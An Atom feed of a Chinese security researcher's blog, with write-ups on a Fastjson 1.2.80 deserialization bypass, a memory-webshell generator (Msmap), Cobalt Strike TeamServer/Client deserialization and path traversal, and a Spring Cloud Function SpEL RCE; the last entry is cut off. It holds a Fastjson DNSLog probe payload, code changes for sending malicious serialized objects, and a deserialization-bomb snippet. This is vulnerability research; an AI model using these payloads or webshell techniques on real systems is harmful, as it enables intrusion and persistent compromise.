<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2022-09-02T10:57:43.834Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fastjson1.2.80漏洞复现</title>
    <link href="https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-09-01T05:10:28.000Z</published>
    <updated>2022-09-02T10:57:43.834Z</updated>
    
    <content type="html"><![CDATA[<p>Fastjson于5月23日，在<a href="https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3">commit 560782c</a>与<a href="https://github.com/alibaba/fastjson/commit/097bff1a792e39f4e0b2807faa53af0e89fbe5e0">commit 097bff1</a>中更新了<a href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">security_update_20220523</a>的修复方案。调整黑白名单的同时额外判断了<code>Exception</code>，并在添加类缓存mappings前新增了<code>autoTypeSupport</code>的判断。</p><p>显而易见<code>Exception</code>的派生类中出了叛徒，不久后<a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a>更新了黑名单类名，直到前几天漏洞作者<a href="https://github.com/iSafeBlue">iSafeBlue</a>公开了思路与Gadgets，本文是对浅蓝师傅议题中留下的一点小作业的复现记录。</p><h2 id="期望类与类缓存"><a href="#期望类与类缓存" class="headerlink" title="期望类与类缓存"></a>期望类与类缓存</h2><p>不太了解的同学可以参考上一篇《Fastjson-autoType漏洞总结》，1.2.80第一步依然是基于众所周知的期望类机制将其它类加入类缓存，关键在于怎么横向出<code>Exception</code>之外的其它类型。</p><p>Fastjson反序列化恢复类实例时，自然也需要恢复用到了的类属性。如果这个属性是可利用的类且我们可控，是不是就能直接利用 或者进一步横向扩展出其它类间接利用。上一篇我们说到了期望类不但可以由JSON显式指定，同样可以由类间关系隐式确定，那么依靠属性名赋值时的隐式类间关系，也就不再需要在JSON中显式指定<code>@type</code>，从而绕过了<code>autoType</code>的白名单检查。</p><p>实例化类属性的对应类后，<strong>fast</strong>json会将其加入到类缓存mappings中，从缓存中取类在修复前不会判断<code>autoTypeSupport</code>，所以绕过了类白名单机制扩展出更多的可用类。</p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ol><li><p>指定显式期望类，实例化<code>XXXException</code>并被加入类缓存</p></li><li><p>通过<code>XXXException</code>中可控的属性名/参数名，由隐式类间关系实例化并被加入类缓存</p></li><li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p></li></ol><p>第二步的重点在于，既然不能显示指定期望类，就只能依靠<code>deserializer</code>去自动处理，我们需要构造出让它解析时进到特定<code>deserializer</code>分支的特定格式。对此我提供一个<code>aspectj</code>读文件和<code>groovy</code>远程类加载的具体实现便于师傅们理解复现。更多Gadgets浅蓝师傅在Slides中写得很清楚了，可以自行构造。</p><p><a href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a></p><p><img src="/img/fastjson1280_a.png"></p><p><img src="/img/fastjson1280_b.png"></p><h2 id="两点小坑"><a href="#两点小坑" class="headerlink" title="两点小坑"></a>两点小坑</h2><p>再提醒两点小坑，<del>一是如果DNSLog是用p师傅的CoNote，存在下划线时是不会被记录到的（这个问题让我自闭了一阵</del></p><p>经继续测试和p师傅提醒，如果链路上的DNS服务器缓存或不接受特殊字符，可能导致DNSLog记录丢失</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;</span><br><span class="line">                &quot;@type&quot;:&quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;:&quot;java.util.Locale&quot;,</span><br><span class="line">                &quot;country&quot;:&quot;g.token.dnslog.pw&quot;,</span><br><span class="line">                &quot;language&quot;:&#123;</span><br><span class="line">                    &quot;@type&quot;:&quot;java.lang.String&quot;&#123;</span><br><span class="line">                    &quot;x&quot;:&#123;</span><br><span class="line">                        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">                        &quot;val&quot;:&quot;org.python.antlr.ParseException&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>二是目前测试来看只有MacOS可以ping带花括号的域名，Linux和Windows会报错。所以这个探测链的Poc需要要合适的报错环境才能看到结果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Fastjson于5月23日，在&lt;a href=&quot;https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3&quot;&gt;commit 560782c&lt;/a&gt;与&lt;a href=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Fastjson" scheme="https://hosch3n.github.io/tags/Fastjson/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="CVE-2022-25845" scheme="https://hosch3n.github.io/tags/CVE-2022-25845/"/>
    
  </entry>
  
  <entry>
    <title>Msmap内存马生成框架（二）</title>
    <link href="https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-08-09T03:34:37.000Z</published>
    <updated>2022-08-11T06:31:44.894Z</updated>
    
    <content type="html"><![CDATA[<p>在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。</p><p>对于俗称的WebShell连接密码，蚁剑用来从请求参数中取数据，冰蝎用作解密请求体数据的密钥，哥斯拉则拆分为了<code>Password</code>和<code>Key</code>，<code>Password</code>取数据、<code>Key</code>用作密钥。为了生成体验不割裂，设计上让蚁剑的密码哈希作为密钥，冰蝎密码从哈希改为明文，哥斯拉的<code>Password</code>和<code>Key</code>用同一个值。这应该并没有降级工具在原本设计上的安全性，冰蝎密码是在客户端取的哈希、哥斯拉回显时密钥也是确定的，也就是说这些机制并不是为防止骑马设计的，主要是对抗纯流量审查，严防骑马害得上RSA。但这是内存马，相对来说更难看到类属性值。</p><blockquote><p>要支持哥斯拉自定义<code>Key</code>也好改，生成设置Password时用逗号分隔拆分一下就行了，只是目前感觉不是很必要</p></blockquote><p>关于执行体，蚁剑是传入<code>response</code>对象内部处理输出，冰蝎是将<code>response</code>对象封装进Map传入内部处理输出，哥斯拉是传入用来接收执行结果的对象，在内存马中自定义处理输出。关于回显编码/加密器，蚁剑和冰蝎是跟着流量走的，哥斯拉是写在内存马中自定义处理的，所以Stub代码片段中会多一个Base64编码函数。</p><p>可以看出哥斯拉在这块耦合度更低，且在第一次流量类初始化后保存对象，后续只用发出简短的指令而非完整类字节码。我有点一根筋，不想因为一个Stub要存对象，就往所有组件类里新增属性，所以复用了注入时的线程锁对象，让被冷落的小可怜活了回来。</p><p>还有一点结构性调整是，感觉冰蝎没有回显界定符和抢占输出，如果访问路径本身有内容输出的话，会干扰到冰蝎拿回显结果。同时也是为了兼容WsFilter及各个<code>stub</code>，将原本在<code>hook</code>中处理的回显输出部分改放到了<code>stub</code>中。</p><p>这个兼容的过程，似乎也与用更精准的数学公式去拟合物理规律 异曲同工（技术没啥长进，倒是越来越会胡说八道了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。&lt;/p&gt;
&lt;p&gt;对于俗称的We</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
    
    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
    
    <category term="Behinder" scheme="https://hosch3n.github.io/tags/Behinder/"/>
    
    <category term="Godzilla" scheme="https://hosch3n.github.io/tags/Godzilla/"/>
    
  </entry>
  
  <entry>
    <title>Msmap内存马生成框架（一）</title>
    <link href="https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-08-08T08:37:10.000Z</published>
    <updated>2022-08-09T03:36:17.888Z</updated>
    
    <content type="html"><![CDATA[<p>一直想要把这部分的知识沉淀一下，最近看到井喷式的新内存马后有了一些小想法，所以整了这么个烂活，作为工具的同时也是一个知识框架。如果能方便大家那就更开心了，不好用也欢迎来issue里喷俺，只是喷完要对人家负责（doge，提出建设性建议</p><hr><p>先拉一面大旗，<del>从钱老的总体设计部可以看出顶层设计的重要性</del>，抱歉调子起高了</p><p><img src="/img/msmapa_a.jpg"></p><p>内存马就是在容器本身的执行流程上，额外加上自己的操作逻辑。比如有个自动化工厂门没锁，我们溜进去，给流水线加一个专门贴狗头的机器，就是利用漏洞打内存马的过程。工厂就象征着Web应用服务器。</p><p>这个狗头机器是加在流水线开头、中间还是结尾，就对应着内存马打到Web应用服务器的不同组件里，流水线一般就是一次网络请求。</p><p>不同工厂的门有圆的有方的有菱形，所以我们的机器为了能偷运进去，就需要适配成不同的外形，但不论外形怎么变，它最终还是一台狗头机器。也就是说内存马要注入进不同的Web应用服务器，需要封装适配成不同的类，但最终还是用于执行某个操作。</p><p>我们要是想机器不止能贴狗头，而是能根据指示来决定贴上狗头、猫猫、嘤嘤鹰。<strong>外形什么的都不用变</strong>，只要升级一下贴纸模块。又或者某些安保好一点的工厂，说猫猫狗狗贴纸不得入内，我们就可以给机器加上一个二维码识别模块，运二维码进去机器内再解码成猫猫狗狗躲避安检。</p><p>贴纸模块就对应着执行体（比如执行系统命令、执行蚁剑客户端流量等），二维码模块就对应着解码器，而二维码生成器就是WebShell客户端的流量加密/编码函数。</p><p>各模块间能相互兼容，平滑替换为别的模块，在软件工程中叫做解藕。msmap做的事就是解藕组件类、编码器与执行体，把内存马这个大任务，拆分成拿context、注入组件、流量解密、代码执行等小目标。这么干除了方便自由组合外，也可以让新技术（Tomcat迟早要被师傅们插成TomShell）更快地应用在实战上。</p><blockquote><p>同理客户端payload不依赖request等对象，解藕出功能执行部分，提供一个接口让外部自己解决输入输出，单论兼容性方面也会更好一点点</p></blockquote><p>胡说八道完了，扯点踏实点的东西。用Python写主要是相对熟悉一些，但是命令行用着终究还是不太方便，不知道用Qt写GUI怎么样。目前这个选择菜单为了支持回退还费了点心思，本来用了另一种方式实现栈但是太别扭了。马子兼容性方面从beichen大佬的代码里偷师学到了用动态代理兼容<code>javax</code>与<code>jakarta</code>的办法，各种方法和类全部用反射，所以编译时不用依赖Tomcat的API了，但目前WsFilter还没调通所以这个还没能安排上自动编译。。。加载Killer本来准备兼容打包一下，后来想起yzddMr6大佬已经集成进了插件，我也就没必要再画蛇添足了。</p><p>最后希望自己能慢慢完善工具，让它支持更多容器组件，也算是作为逐渐成长的一种见证，与各位师傅共勉！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直想要把这部分的知识沉淀一下，最近看到井喷式的新内存马后有了一些小想法，所以整了这么个烂活，作为工具的同时也是一个知识框架。如果能方便大家那就更开心了，不好用也欢迎来issue里喷俺，只是喷完要对人家负责（doge，提出建设性建议&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先拉一面大旗，&lt;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="Tomcat" scheme="https://hosch3n.github.io/tags/Tomcat/"/>
    
    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
    
    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
    
    <category term="Killer" scheme="https://hosch3n.github.io/tags/Killer/"/>
    
  </entry>
  
  <entry>
    <title>某C2鸡肋漏洞分析</title>
    <link href="https://hosch3n.github.io/2022/05/12/%E6%9F%90C2%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2022/05/12/%E6%9F%90C2%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-05-12T05:08:44.000Z</published>
    <updated>2022-07-04T07:34:17.330Z</updated>
    
    <content type="html"><![CDATA[<p>CobaltStrike是一个知名的红队命令与控制框架，采用<code>Beacon &lt;-&gt; TeamServer &lt;-&gt; Client</code>架构。TeamServer存在受限路径穿越写文件与反序列化漏洞，可以被认证后客户端恶意利用。Client存在反序列化漏洞，可以被RogueCS攻击。</p><p>Author: hosch3n@逐日实验室</p><h2 id="山寨威胁建模"><a href="#山寨威胁建模" class="headerlink" title="山寨威胁建模"></a>山寨威胁建模</h2><p>由于这个软件的特殊性，我们需要想想什么才是漏洞：</p><ol><li><p>直接攻击TeamServer暴露的服务</p></li><li><p>通过Beacon攻击TeamServer</p></li><li><p>通过Client攻击TeamServer</p></li><li><p>通过TeamServer攻击Client</p></li></ol><ul><li>TeamServer控制Beacon是功能，任何所谓TeamServer攻击Beacon的操作都不能算漏洞</li></ul><p>可以看出TeamServer是核心，先从它下手。</p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><ul><li><a href="https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/">in-the-wild</a></li></ul><p>利用TeamServer从Beacon下载文件时，会将Beacon可控数据中的IP字段作为目录的特点，实现路径穿越写计划任务RCE。</p><ul><li><a href="https://www.sentinelone.com/labs/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/">CVE-2021-36798</a></li></ul><p>利用TeamServer从Beacon加载截图和键盘记录时，会根据Beacon可控数据中的字节大小申请内存的特点，实现内存耗尽DoS。</p><ul><li><a href="https://download.cobaltstrike.com/releasenotes.txt">CVE-2022-23317</a></li></ul><p>猜测是为了兼容<code>proxy</code>的功能（路径为<code>http://</code>开头），没有对URL路径做严谨的校验。动态调试可以看出这会绕过profile相关配置，直接拿到公钥等数据：</p><p><img src="/img/mc2ldfx_a.png"></p><h2 id="虚假的DoS"><a href="#虚假的DoS" class="headerlink" title="虚假的DoS"></a>虚假的DoS</h2><p><code>BeaconC2.process_beacon_data</code>中存在一处利用条件比较苛刻的DoS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">int</span> var4 = var3.readInt();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (var4 &gt; var3.available()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">byte</span>[] var5 = <span class="keyword">new</span> <span class="keyword">byte</span>[var4];</span><br></pre></td></tr></table></figure><h2 id="受限路径穿越"><a href="#受限路径穿越" class="headerlink" title="受限路径穿越"></a>受限路径穿越</h2><p><img src="/img/mc2ldfx_b.png"></p><p>用来防止路径穿越的核心是<code>CommonUtils.SafeFile</code>方法，判断解析前后的路径是否还以限定前缀开头。这其实可以让我们向上穿越一级并得到前缀开头的文件对象：</p><p><img src="/img/mc2ldfx_c.png"></p><ul><li><a href="https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/">CVE-2022-23457</a>就是另一个例子</li></ul><p>以<code>ManageUser.process</code>为例，Client可以通过<code>Host File</code>功能上传文件到TeamServer并映射至Web服务，这会先发出一个<code>armitage.upload</code>进行预处理，随后由<code>armitage.append</code>上传文件数据。</p><p><img src="/img/mc2ldfx_d.png"></p><p>这里Client与TeamServer基于序列化通过socket通信，<code>SafeFile</code>的二参<code>var1.arg(0)</code>客户端可控，在<code>UploadFile.result</code>拼接上前缀就可以实现受限路径穿越写文件。<del>然而这并没有什么卵用</del></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.conn.call(<span class="string">&quot;armitage.append&quot;</span>, CommonUtils.args(<span class="keyword">this</span>.file.getName()</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line"><span class="keyword">this</span>.conn.call(<span class="string">&quot;armitage.append&quot;</span>, CommonUtils.args(<span class="string">&quot;../uploads&quot;</span>+<span class="keyword">this</span>.file.getName()</span><br></pre></td></tr></table></figure><p><img src="/img/mc2ldfx_e.png"></p><p>想到zip解压释放软链接那种套路，File确实可以透过软链接写入指向文件中，但这里似乎没法实现直接将用于路径穿越的软链接本身存进去。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><img src="/img/mc2ldfx_f.png"></p><p>反序列化核心是<code>TeamSocket.readObject</code>方法，实际使用的<code>ObjectInputStream.readUnshared</code>。它在<code>ManageUser.run</code>中被<code>PostAuthentication.clientAuthenticated</code>通过多线程拉起。</p><p><img src="/img/mc2ldfx_g.png"></p><p><code>client</code>来自<code>SecureServerSocket.acceptAndAuthenticate</code>中接收的客户端数据，预检密码使用<code>readUnsignedByte</code>读入，在密码比对正确时会进入上述反序列化流程。</p><p><img src="/img/mc2ldfx_h.png"></p><p>在客户端<code>Connect.dialogAction</code>发起连接时可以向TeamServer传输序列化对象，如果服务端存在gadgets环境就可被恶意利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.tqueue.call(<span class="string">&quot;aggressor.authenticate&quot;</span>, CommonUtils.args(var3, var6, Aggressor.VERSION), <span class="keyword">this</span>);</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line">Object payload = getObject() <span class="comment">// URLDNS, 7u21, ...</span></span><br><span class="line"><span class="keyword">this</span>.tqueue.call(<span class="string">&quot;aggressor.authenticate&quot;</span>, CommonUtils.args(var3, var6, payload), <span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><ul><li>看代码流程感觉作者是考虑到了的，所以将反序列化放到了认证后</li></ul><p>随后<code>ManageUser.process</code>会将登录成功/失败的消息序列化写回客户端，我们可以把<code>SecureServerSocket.authenticate</code>改为任何密码都校验成功（欺骗客户端通过密码预检），再写回恶意序列化对象（成为RogueCS），如果客户端存在gadgets环境就可被利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.authenticated &amp;&amp; <span class="string">&quot;aggressor.authenticate&quot;</span>.equals(var1.getCall()) &amp;&amp; var1.size() == <span class="number">3</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    Object payload = getObject() <span class="comment">// URLDNS, 7u21, ...</span></span><br><span class="line">    <span class="keyword">this</span>.client.writeObject(var1.reply(payload))</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Client攻击TeamServer的话，需要知道服务端的密码（比如通过泄漏/反制得到HOME目录下<code>.aggressor.prop</code>配置文件），而通过TeamServer则可以攻击任何前来连接的Client。</p><p>危害大小取决于运行环境中gadgets的能力，我目前还没在CS内置的lib中找到有实质危害的gadgets。对于原生JRE环境而言，可以通过<code>DeserializationBomb</code>造成CPU型DoS：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Object&gt; root = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">Set&lt;Object&gt; s1 = root;</span><br><span class="line">Set&lt;Object&gt; s2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    Set&lt;Object&gt; t1 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    Set&lt;Object&gt; t2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    t1.add(<span class="string">&quot;foo&quot;</span>); <span class="comment">// make it not equal to t2</span></span><br><span class="line">    s1.add(t1);</span><br><span class="line">    s1.add(t2);</span><br><span class="line">    s2.add(t1);</span><br><span class="line">    s2.add(t2);</span><br><span class="line">    s1 = t1;</span><br><span class="line">    s2 = t2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/mc2ldfx_i.png"></p><p>这个与之前OpenSSL的DoS效果类似，多核环境只会影响单核。相关上下文大都是局部变量，也不太可能通过反序列化造成内存型DoS。所以一般也就能打个DNS自嗨，但如果以前调试漏洞在<code>jre/lib/ext</code>之类的目录引入过危险依赖，或者有大聪明用了7u21就会导致RCE：</p><p><img src="/img/mc2ldfx_j.png"></p><p>CS内置了<code>commons-io</code>、<code>sleep</code>等jar包，找到链也不是完全没有可能，或者找到一种可控方式从当前目录加载类，就能结合受限路径穿越变成RCE。万一山鸡变凤凰了呢（doge</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CobaltStrike是一个知名的红队命令与控制框架，采用&lt;code&gt;Beacon &amp;lt;-&amp;gt; TeamServer &amp;lt;-&amp;gt; Client&lt;/code&gt;架构。TeamServer存在受限路径穿越写文件与反序列化漏洞，可以被认证后客户端恶意利用。Clie</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="Traversal" scheme="https://hosch3n.github.io/tags/Traversal/"/>
    
    <category term="DoS" scheme="https://hosch3n.github.io/tags/DoS/"/>
    
    <category term="CNVD-2022-45437" scheme="https://hosch3n.github.io/tags/CNVD-2022-45437/"/>
    
  </entry>
  
  <entry>
    <title>SpringCloudFunction漏洞分析</title>
    <link href="https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-03-25T18:14:51.000Z</published>
    <updated>2022-04-07T08:50:39.861Z</updated>
    
    <content type="html"><![CDATA[<p>SpringCloudFunction是一个SpringBoot开发的Servless中间件（FAAS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;= 版本 &lt;= 3.2.2（<code>commit dc5128b</code>之前）存在SpEL表达式执行导致的RCE。</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>在<code>main</code>分支<a href="https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52">commit dc5128b</a>中，新增了<code>SimpleEvaluationContext</code>：</p><p><img src="/img/scfspel_a.png"></p><p>由<code>isViaHeader</code>变量作为flag，在解析前判断<code>spring.cloud.function.routing-expression</code>的值是不是取自HTTP头，如果是的话就用<code>SimpleEvaluationContext</code>解析SpEL语句，不是来自外部输入时（比如<code>System.setProperty</code>）才用<code>StandardEvaluationContext</code>解析。</p><p><img src="/img/scfspel_b.png"></p><p>同样的，官方测试用例已经清楚地写明了漏洞位置与Payload：</p><p><img src="/img/scfspel_c.png"></p><p>提取出测试类后在apply方法下断并跟入，省略一些中间流程，最终可以看到从HTTP头<code>spring.cloud.function.routing-expression</code>中取出SpEL表达式并由<code>StandardEvaluationContext</code>解析：</p><p><img src="/img/scfspel_d.png"></p><p>至此source与sink已经清晰，虽然测试用例可以模拟触发漏洞，但还是要搭出一套能实际复现的环境。刚开始时想不开，自己在那啃文档碎碎写了一两个小时demo硬是搭不起来，后来发现<a href="https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo">官方提供的sample</a>就很好用Orz：</p><p><img src="/img/scfspel_e.png"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>好消息是只有Spring Cloud Function部分版本<del>特定配置的动态路由才会受影响（<code>spring.cloud.function.definition=functionRouter</code>）</del>，坏消息是SpEL表达式存在charset、replace等多种变形。</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><a href="https://twitter.com/phithon_xg/status/1511760497179193346">https://twitter.com/phithon_xg/status/1511760497179193346</a></p><p><img src="/img/scfspel_f.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.spring.io/spring-cloud-function/docs/3.2.2/reference/html/spring-cloud-function.html#_function_routing_and_filtering">Function Routing and Filtering</a></p><p><a href="https://stackoverflow.com/questions/63389412/vanilla-spring-cloud-function-with-routing">Vanilla Spring Cloud Function with Routing</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SpringCloudFunction是一个SpringBoot开发的Servless中间件（FAAS），支持基于SpEL的函数式动态路由。在特定配置下，3 &amp;lt;= 版本 &amp;lt;= 3.2.2（&lt;code&gt;commit dc5128b&lt;/code&gt;之前）存在SpEL表</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="servless" scheme="https://hosch3n.github.io/tags/servless/"/>
    
    <category term="CVE-2022-22963" scheme="https://hosch3n.github.io/tags/CVE-2022-22963/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson-autoType漏洞总结</title>
    <link href="https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-24T09:38:23.000Z</published>
    <updated>2022-05-12T03:37:27.171Z</updated>
    
